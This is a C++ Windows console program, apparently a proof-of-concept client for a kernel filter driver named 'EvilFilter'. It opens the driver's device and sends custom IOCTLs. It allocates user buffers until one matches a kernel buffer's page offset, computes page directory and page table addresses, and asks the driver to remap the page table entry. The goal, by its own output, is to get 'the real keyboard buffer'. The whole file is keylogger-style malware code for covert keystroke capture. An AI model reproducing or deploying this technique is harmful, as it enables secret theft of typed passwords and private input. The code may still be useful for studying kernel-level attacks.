// ConsoleApplication2.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <SharedHeader.h>

VOID WaitAMinute() {
	printf("Waiting a minute...");
	SYSTEMTIME systemTime;
	GetSystemTime(&systemTime);
	WORD CurrentMinute = systemTime.wMinute;
	WORD ExitMinute;
	if (systemTime.wSecond > 30) {
		ExitMinute = systemTime.wMinute + 2;
	}
	else {
		ExitMinute = systemTime.wMinute + 1;
	}
	//while (FALSE) {
	while (CurrentMinute != ExitMinute) {
		GetSystemTime(&systemTime);
		CurrentMinute = systemTime.wMinute;
	}
	printf("done waiting\n");
}

int main(int argc, _TCHAR* argv[]) {
	#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
	ULONG  bytes;

	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"),
		GENERIC_READ | GENERIC_WRITE, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, //0, // FILE_SHARE_READ | FILE_SHARE_WRITE
		NULL, // no SECURITY_ATTRIBUTES structure
		OPEN_EXISTING, // No special create flags
		0, //  No special attributes
		NULL); // No template file

	if (INVALID_HANDLE_VALUE == hControlDevice) {
		printf("Failed to open EvilFilter device\n");
	}
	else {

		PKEYBOARD_INPUT_DATA keyboardData;
		OVERLAPPED      DeviceIoOverlapped;
		PSHARED_MEMORY_STRUCT dataToTransmit;

		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);

		dataToTransmit->instruction = 'O';
		dataToTransmit->offset = 0;

		DeviceIoOverlapped.Offset = 0;
		DeviceIoOverlapped.OffsetHigh = 0;
		DeviceIoOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);


		if (!DeviceIoControl(hControlDevice,
			IOCTL_CUSTOM_CODE,
			NULL, 0,
			dataToTransmit, SharedMemoryLength,
			&bytes, &DeviceIoOverlapped)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
		}
		else {
			ULONG kmdfOffset = dataToTransmit->offset;
			ULONG keyboardOffset = (ULONG)keyboardData & 0x0fff;
			printf("Ioctl to EvilFilter device succeeded...offsets are [0x%lx] [0x%lx]\n", kmdfOffset, keyboardOffset);


			keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
			keyboardOffset = (ULONG)keyboardData & 0x0fff;
			PLLIST listNode;
			listNode = (PLLIST)malloc(sizeof(LLIST));
			listNode->keyboardBuffer = keyboardData;
			listNode->previous = NULL;
			while (keyboardOffset != kmdfOffset) {
				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
				keyboardOffset = (ULONG)keyboardData & 0x0fff;
				PLLIST previousListNode = listNode;
				listNode = (PLLIST)malloc(sizeof(LLIST));
				listNode->keyboardBuffer = keyboardData;
				listNode->previous = previousListNode;
			}
			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
			while (listNode != NULL) {
				PLLIST currentListNode = listNode;
				listNode = listNode->previous;
				if (currentListNode->keyboardBuffer != keyboardData) {
					free(currentListNode->keyboardBuffer);
				}
				free(currentListNode);
			}

			PVOID ppde = GetPdeAddress(keyboardData);
			PVOID ppte = GetPteAddress(keyboardData);
			printf("Page Directory is [0x%lx] Page Table is [0x%lx]\n", ppde, ppte);

			dataToTransmit->ClientMemory = keyboardData;
			dataToTransmit->PageDirectory = ppde;
			dataToTransmit->PageTable = ppte;
			dataToTransmit->instruction = 'E';

			if (!DeviceIoControl(hControlDevice,
				IOCTL_CUSTOM_CODE,
				NULL, 0,
				dataToTransmit, SharedMemoryLength,
				&bytes, &DeviceIoOverlapped)) {
				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			}
			else {
				printf("Ioctl to EvilFilter device succeeded - we now have the real keyboard buffer!!!\n");
				WaitAMinute();
				WaitAMinute();
				WaitAMinute();
			}
		}
		CloseHandle(hControlDevice);
		WaitAMinute();
		WaitAMinute();
		// Everything dies right here, right as we exit
	}
	return 0;
}


PVOID GetPdeAddress(PVOID virtualaddr) {
	//ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 21;
	ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 22;
	printf("\n\nVirtualAddress [0x%lx] pageDirectoryIndex is [0x%lx]\n", virtualaddr, pageDirectoryIndex);
	PVOID pageDirectory = (PVOID)(PROCESS_PAGE_DIRECTORY_BASE + (pageDirectoryIndex * PTE_SIZE));
	printf("pageDirectoryTable   [0x%lx] ", pageDirectory);
	if ((pageDirectory)) {
		return pageDirectory;
	}
	else {
		printf(" is INVALID\n");
		return NULL;
	}
}

PVOID GetPteAddress(PVOID virtualaddr) {
	//ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 21;
	//ULONG pageTableIndex = (ULONG)virtualaddr >> 12 & 0x01FF;
	ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 22;
	ULONG pageTableIndex = (ULONG)virtualaddr >> 12 & 0x03FF;
	PVOID pageTable = (PVOID)(PROCESS_PAGE_TABLE_BASE + (pageTableIndex * PTE_SIZE) + (PAGE_SIZE * pageDirectoryIndex));
	printf("pageTable   [0x%lx] \n", pageTable);
	if ((pageTable)) {
		return pageTable;
	}
	else {
		printf(" is INVALID\n");
		return NULL;
	}
}

